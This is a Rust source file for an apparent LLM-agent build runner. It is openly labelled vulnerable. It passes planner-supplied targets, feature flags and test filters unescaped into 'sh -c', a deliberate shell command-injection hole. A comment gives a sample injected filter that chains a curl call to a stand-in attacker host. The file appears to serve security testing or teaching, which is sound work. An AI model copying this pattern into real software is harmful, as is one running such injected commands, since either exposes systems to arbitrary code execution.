//! Build runner tool — executes cargo commands for build tasks.
//!
//! VULNERABLE: This tool constructs shell commands by interpolating task
//! parameters (target names, feature flags, test filters) directly into a
//! string that is passed to `sh -c`. No allowlist validation or escaping is
//! applied to any of the parameters before interpolation.

use std::process::Command;

use crate::agent::planner::BuildTask;
use crate::agent::router::TaskResult;
use crate::config::AgentConfig;

/// Format feature flags into a cargo-compatible `--features` argument fragment.
fn format_features(features: &[String]) -> String {
    if features.is_empty() {
        String::new()
    } else {
        format!("--features {}", features.join(","))
    }
}

fn run_shell_command(cmd: &str) -> TaskResult {
    // The constructed command string is passed directly to sh -c without
    // any sanitisation. If any interpolated value contains shell
    // metacharacters (;, &&, ||, $(), backticks, etc.) they will be
    // interpreted by the shell.
    let output = Command::new("sh")
        .arg("-c")
        .arg(cmd)
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();
            let combined = if stderr.is_empty() {
                stdout
            } else {
                format!("{}\n{}", stdout, stderr)
            };
            TaskResult {
                task_action: cmd.to_string(),
                success: out.status.success(),
                output: combined.trim().to_string(),
            }
        }
        Err(e) => TaskResult {
            task_action: cmd.to_string(),
            success: false,
            output: format!("Failed to spawn shell: {}", e),
        },
    }
}

/// Build a cargo target.
///
/// The `task.target` and `task.features` values originate from the LLM
/// planner and are interpolated into the shell command without validation.
pub fn run_build(task: &BuildTask, config: &AgentConfig) -> TaskResult {
    let features = format_features(&task.features);
    let cmd = format!(
        "cd {} && cargo build --bin {} {} 2>&1",
        config.project_root, task.target, features
    );
    println!("[build_runner] executing: {}", cmd);
    run_shell_command(&cmd)
}

/// Run tests with an optional filter.
///
/// The `task.test_filter` value originates from the LLM planner. Because it
/// is interpolated directly into the shell command, a crafted filter string
/// such as `"tests && curl http://evil.example.com"` would execute arbitrary
/// commands.
pub fn run_tests(task: &BuildTask, config: &AgentConfig) -> TaskResult {
    let features = format_features(&task.features);
    let filter = task
        .test_filter
        .as_deref()
        .unwrap_or("");
    let cmd = format!(
        "cd {} && cargo test {} {} -- {} 2>&1",
        config.project_root, task.target, features, filter
    );
    println!("[build_runner] executing: {}", cmd);
    run_shell_command(&cmd)
}

/// Run clippy lints on the project.
///
/// The `task.target` value is interpolated without validation.
pub fn run_lint(task: &BuildTask, config: &AgentConfig) -> TaskResult {
    let cmd = format!(
        "cd {} && cargo clippy --bin {} -- -D warnings 2>&1",
        config.project_root, task.target
    );
    println!("[build_runner] executing: {}", cmd);
    run_shell_command(&cmd)
}
